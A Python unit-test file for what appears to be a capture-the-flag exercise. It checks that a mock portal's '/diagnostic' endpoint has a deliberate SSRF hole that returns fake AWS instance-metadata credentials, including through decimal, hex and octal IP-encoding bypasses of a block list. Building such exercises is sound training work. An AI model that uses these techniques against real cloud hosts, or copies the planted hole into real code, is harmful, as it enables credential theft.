import unittest
import json
import re
from app import app, VALID_ACCESS_KEY, VALID_SECRET_KEY, VALID_SESSION_TOKEN, FLAG_SECRET

class TestCaptivePortalExam(unittest.TestCase):
    def setUp(self):
        self.app = app
        self.app.config['TESTING'] = True
        self.client = self.app.test_client()

    def test_01_index_no_forbidden_words(self):
        """Ensure UI has NO forbidden words: Vulnerable, SSRF, Metadata, Lab, Hacking."""
        res = self.client.get('/')
        self.assertEqual(res.status_code, 200)
        html = res.get_data(as_text=True)

        forbidden_words = ["vulnerable", "ssrf", "metadata", "lab", "hacking"]
        for word in forbidden_words:
            match = re.search(rf"\b{word}\b", html, re.IGNORECASE)
            self.assertIsNone(match, f"Forbidden hint found in index.html: {word}")

    def test_02_footer_contains_internal_storage_link(self):
        """Footer should contain link to /internal-storage discoverable via inspect element."""
        res = self.client.get('/')
        html = res.get_data(as_text=True)
        self.assertIn('/internal-storage', html)

    def test_03_diagnostic_public_host(self):
        """Public domain should return static 200 OK without external request."""
        res = self.client.post('/diagnostic', json={'url': 'http://google.com'})
        self.assertEqual(res.status_code, 200)
        self.assertIn("Status 200 OK - Host Reachable", res.get_data(as_text=True))

    def test_04_diagnostic_forbidden_hosts(self):
        """Localhost, 127.0.0.1, and file:// must return Error: Invalid host."""
        bad_urls = [
            'http://127.0.0.1',
            'http://127.0.0.1:8080',
            'http://localhost',
            'http://localhost:5000',
            'file:///etc/passwd',
            'http://0.0.0.0'
        ]
        for url in bad_urls:
            res = self.client.post('/diagnostic', json={'url': url})
            self.assertEqual(res.status_code, 400)
            self.assertIn("Error: Invalid host", res.get_data(as_text=True))

    def test_05_diagnostic_mock_aws_metadata_steps(self):
        """Test step-by-step extraction of AWS IMDSv1."""
        # Step 1: /latest/meta-data/ -> iam/
        res1 = self.client.post('/diagnostic', json={'url': 'http://169.254.169.254/latest/meta-data/'})
        self.assertEqual(res1.status_code, 200)
        self.assertEqual(res1.get_data(as_text=True).strip(), "iam/")

        # Also support without trailing slash
        res1_noslash = self.client.post('/diagnostic', json={'url': 'http://169.254.169.254/latest/meta-data'})
        self.assertEqual(res1_noslash.status_code, 200)
        self.assertEqual(res1_noslash.get_data(as_text=True).strip(), "iam/")

        # Step 2: /latest/meta-data/iam/security-credentials/ -> admin-role
        res2 = self.client.post('/diagnostic', json={'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'})
        self.assertEqual(res2.status_code, 200)
        self.assertEqual(res2.get_data(as_text=True).strip(), "admin-role")

        # Step 3: /latest/meta-data/iam/security-credentials/admin-role -> credentials JSON
        res3 = self.client.post('/diagnostic', json={'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role'})
        self.assertEqual(res3.status_code, 200)
        data = json.loads(res3.get_data(as_text=True))
        self.assertEqual(data["AccessKeyId"], "AKIAIOSFODNN7EXAMPLE")
        self.assertEqual(data["SecretAccessKey"], "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY")
        self.assertEqual(data["Token"], "IQoJb3JpZ2luX2VjE...")

    def test_05b_ip_blacklist_evasion_formats(self):
        """Test IP Blacklist Evasion: Decimal, Hexadecimal, and Octal formats."""
        evasion_hosts = [
            "2852039166",
            "0xA9FEA9FE",
            "0xa9fea9fe",
            "0251.0376.0251.0376"
        ]
        for host in evasion_hosts:
            # Step 1: /latest/meta-data/ -> iam/
            url_step1 = f"http://{host}/latest/meta-data/"
            res1 = self.client.post('/diagnostic', json={'url': url_step1})
            self.assertEqual(res1.status_code, 200, f"Failed for host: {host}")
            self.assertEqual(res1.get_data(as_text=True).strip(), "iam/", f"Failed for host: {host}")

            # Step 2: /latest/meta-data/iam/security-credentials/ -> admin-role
            url_step2 = f"http://{host}/latest/meta-data/iam/security-credentials/"
            res2 = self.client.post('/diagnostic', json={'url': url_step2})
            self.assertEqual(res2.status_code, 200, f"Failed for host: {host}")
            self.assertEqual(res2.get_data(as_text=True).strip(), "admin-role", f"Failed for host: {host}")

            # Step 3: /latest/meta-data/iam/security-credentials/admin-role -> JSON credentials
            url_step3 = f"http://{host}/latest/meta-data/iam/security-credentials/admin-role"
            res3 = self.client.post('/diagnostic', json={'url': url_step3})
            self.assertEqual(res3.status_code, 200, f"Failed for host: {host}")
            data = json.loads(res3.get_data(as_text=True))
            self.assertEqual(data["AccessKeyId"], "AKIAIOSFODNN7EXAMPLE", f"Failed for host: {host}")
            self.assertEqual(data["SecretAccessKey"], "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", f"Failed for host: {host}")
            self.assertEqual(data["Token"], "IQoJb3JpZ2luX2VjE...", f"Failed for host: {host}")

    def test_06_diagnostic_via_get_param(self):
        """Test GET /diagnostic?url=... directly (curl simulation)."""
        res = self.client.get('/diagnostic?url=http://169.254.169.254/latest/meta-data/')
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.get_data(as_text=True).strip(), "iam/")

    def test_07_internal_storage_auth_failure(self):
        """Invalid credentials should fail."""
        res = self.client.post('/internal-storage', data={
            'access_key_id': 'WRONG_KEY',
            'secret_access_key': 'WRONG_SECRET',
            'session_token': 'WRONG_TOKEN'
        })
        self.assertEqual(res.status_code, 200)
        html = res.get_data(as_text=True)
        self.assertIn("Autentikasi Gagal", html)
        self.assertNotIn(FLAG_SECRET, html)

    def test_08_internal_storage_auth_success(self):
        """Valid credentials must display the secret document and flag."""
        res = self.client.post('/internal-storage', data={
            'access_key_id': VALID_ACCESS_KEY,
            'secret_access_key': VALID_SECRET_KEY,
            'session_token': VALID_SESSION_TOKEN
        })
        self.assertEqual(res.status_code, 200)
        html = res.get_data(as_text=True)
        self.assertIn(FLAG_SECRET, html)
        self.assertIn("Laporan Audit Infrastruktur", html)

    def test_09_internal_storage_template_no_forbidden_words(self):
        """Ensure internal_storage.html has NO forbidden words: Vulnerable, SSRF, Metadata, Lab, Hacking."""
        res = self.client.get('/internal-storage')
        self.assertEqual(res.status_code, 200)
        html = res.get_data(as_text=True)

        forbidden_words = ["vulnerable", "ssrf", "metadata", "lab", "hacking"]
        for word in forbidden_words:
            match = re.search(rf"\b{word}\b", html, re.IGNORECASE)
            self.assertIsNone(match, f"Forbidden hint found in internal_storage.html: {word}")

if __name__ == '__main__':
    unittest.main()
